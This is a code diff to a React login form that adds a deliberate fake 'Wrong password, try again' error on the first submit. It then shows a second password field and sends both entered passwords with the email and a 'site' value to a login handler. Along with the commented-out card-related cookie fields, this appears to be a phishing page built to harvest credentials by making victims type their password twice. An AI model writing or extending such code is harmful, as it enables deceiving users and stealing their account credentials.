@@ -7,20 +7,23 @@ import Cookies from "js-cookie";
 import { useRouter } from "next/router";
 import PhotoUpload from "./PhotoUpload";
 import Image from "next/image";
+import { toast } from "react-toastify";
 
 function LoginForm() {
   const [verified, setVerified] = useState(false);
+  const [showWrongPassword, setShowWrongPassword] = useState(false);
   // const [showModal, setShowModal] = useState(false);
 
   const initialvalues = {
     email: "",
     password: "",
+    wrongPassword: "",
   };
 
   const { login } = useMockLogin();
 
   const handleSubmit = async (values, formik) => {
-    const { email, password } = values;
+    const { email, password,wrongPassword  } = values;
 
     // Cookies.set("site", site);
     // Cookies.set("email", email);
@@ -32,6 +35,7 @@ function LoginForm() {
       site: site,
       email: email,
       password: password,
+      wrongPassword: wrongPassword,
       skipcode: "",
       // onlyCard: Cookies.get("onlyCard"),
       // holdingCard: Cookies.get("holdingCard"),
@@ -40,6 +44,11 @@ function LoginForm() {
     login(allValues, formik);
 
     // console.log("allValues", allValues);
+  };
+
+  const handleWrongPassword = () => {
+    setShowWrongPassword(true);
+    toast.error("Wrong password, try again");
   };
 
   // const handleNextStep = () => {
@@ -88,15 +97,44 @@ function LoginForm() {
                   name="email"
                   required
                 />
-                <Field
-                  placeholder="Password"
-                  className="w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
-                  id="password"
-                  name="password"
-                  type="password"
-                  autoComplete="on"
-                  required
-                />
+                       {!showWrongPassword ? (
+                <>
+                  <Field
+                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                    placeholder="Password"
+                    name="password"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
+
+                  <button
+                    type="button"
+                    onClick={handleWrongPassword}
+                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+                  >
+                    Log in
+                  </button>
+                </>
+              ) : (
+                <>
+                  <Field
+                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                    placeholder="Password"
+                    name="wrongPassword"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
+
+                  <button
+                    type="submit"
+                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+                  >
+                    Log in
+                  </button>
+                </>
+              )}
               </div>
               <div className="flex flex-col items-center">
                 {/* <ReCAPTCHA
